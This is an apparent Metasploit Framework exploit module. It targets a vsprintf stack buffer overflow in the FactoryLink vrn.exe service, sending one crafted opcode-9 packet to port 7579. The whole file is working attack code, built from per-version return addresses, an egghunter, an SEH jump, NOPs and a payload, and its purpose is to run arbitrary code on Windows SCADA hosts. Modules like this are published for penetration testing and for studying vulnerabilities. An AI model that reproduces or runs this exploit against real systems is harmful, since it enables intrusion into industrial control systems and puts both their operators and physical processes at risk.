# $Id: factorylink_vrn_09.rb 12998 2011-06-21 21:08:57Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;FactoryLink vrn.exe Opcode 9 Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in FactoryLink 7.5, 7.5 SP2,
                and 8.0.1.703.  By sending a specially crafted packet, an attacker may be able to
                execute arbitrary code due to the improper use of a vsprintf() function while
                processing the user-supplied text field.  Originally found and posted by
                Luigi Auriemma.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;, # Public exploit
                    &#039;hal&#039;             # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12998 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;72815&#039;],
                    [&#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/factorylink_4-adv.txt&#039;]
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 885,
                    &#039;BadChars&#039; => "\x00",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;FactoryLink 7.5&#039;,        { &#039;Ret&#039; => 0x1c0106ac, &#039;padding&#039; => 0 } ],
                    [ &#039;FactoryLink 7.5 SP2&#039;,    { &#039;Ret&#039; => 0x1c01069c, &#039;padding&#039; => 0 } ],
                    [ &#039;FactoryLink 8.0.1.703&#039;,  { &#039;Ret&#039; => 0x1c01087c, &#039;padding&#039; => 4 } ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Mar 21 2011&#039;))
 
        register_options([Opt::RPORT(7579)], self.class)
    end
 
    def exploit
        connect
 
        #The use of egghunter seems appropriate due to the small buffer in [ESP+8]
        hunter = generate_egghunter(payload.encoded, payload_badchars,
            { :checksum => true, :startreg => &#039;ebp&#039;})
 
        egg = hunter[1]
 
        header =   "\x3f\x3f\x3f\x3f"
        header <<  "\xff\x55"
        header <<  "\x09\x00"
        header <<  "\x3f\x3f\xff\xff\x00\x00\x3f\x3f"
        header <<  "\x01\x00\x3f\x3f\x3f\x3f\x3f\x3f"
        header <<  "\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
        header <<  "\x3f\x3f"
        header <<  "\xff\xff\xff\xff"
        header <<  "\x3f\x3f"
 
        request =  header
        request << rand_text_alpha_upper(100)
        request << egg
        request << rand_text_alpha(target[&#039;padding&#039;])
        request << "\xeb\x06\x90\x90"
        request << [target.ret].pack(&#039;V&#039;)
        request << make_nops(24)
        request << hunter[0]
        request << rand_text_alpha_upper(100000)
 
        print_status("Trying target #{target.name} with #{request.size} bytes")
        sock.put(request)
 
        handler
        disconnect
    end
end



